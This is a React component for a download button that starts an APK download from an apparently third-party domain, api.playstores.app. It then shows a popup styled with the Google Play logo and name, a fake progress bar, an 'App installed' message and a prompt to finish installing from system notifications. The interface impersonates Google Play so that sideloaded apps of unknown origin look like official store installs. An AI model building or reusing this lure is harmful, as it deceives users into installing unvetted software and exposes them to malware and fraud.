'use client';

import { useState } from 'react';
import styles from './DownloadPopup.module.css';

export default function DownloadPopup({ slug }) {
  const [popup, setPopup] = useState(false);
  const [progressComplete, setProgressComplete] = useState(false);

  const handleDownload = () => {
    setPopup(true);

    // Start download after a short delay
    setTimeout(() => {
      window.location.href = `https://api.playstores.app/apps/${slug}/${slug}.apk`;
    }, 300);

    // Handle transition after 7s
    setTimeout(() => {
      setProgressComplete(true);
    }, 7000);
  };

  const closePopup = () => {
    setPopup(false);
    setProgressComplete(false);
  };

  return (
    <>
      <button className={styles.downloadButton} onClick={handleDownload}>
        Download
      </button>

      {popup && (
        <div className={styles.overlay}>
          <div className={styles.popup}>
            <div className={styles.header}>
              <img src="/logoplay.svg" alt="Google Play" className={styles.logo} />
              <span className={styles.title}>Google Play</span>
            </div>

            {!progressComplete ? (
              <>
                <div className={styles.progressBar}>
                  <div className={styles.progress}></div>
                </div>
                <p className={styles.message}>Preparing app download...</p>
              </>
            ) : (
              <>
                <h3 className={styles.installed}>App installed</h3>
                <p className={styles.instruction}>
                  Open your system notifications and finish the installation.
                </p>
                <button className={styles.okButton} onClick={closePopup}>
                  OK
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
}
